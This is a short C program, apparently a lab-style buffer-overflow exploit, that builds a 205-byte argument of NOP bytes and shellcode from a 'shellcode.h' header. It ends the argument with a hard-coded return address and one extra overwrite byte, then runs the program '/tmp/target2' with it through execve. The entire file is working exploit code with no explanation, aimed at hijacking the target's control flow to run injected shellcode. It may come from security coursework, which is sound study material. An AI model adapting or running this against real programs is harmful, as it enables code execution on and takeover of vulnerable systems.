#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET    "/tmp/target2"
#define NOP       0x90

int main(void)
{
  char *args[3];
  char *env[1];

  char buffer[205];

  int length = strlen(shellcode); 

  for (int i = 0 ; i < 205 ; i++)
    buffer[i] = NOP;

  int k = 200-length;
  for (int j = 0; j < length ; k++, j++)
    buffer[k] = shellcode[j];

  buffer[200] = 0xb0;
  buffer[201] = 0xfc;
  buffer[202] = 0xff;
  buffer[203] = 0xbf;
  buffer[204] = 0x74;


  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
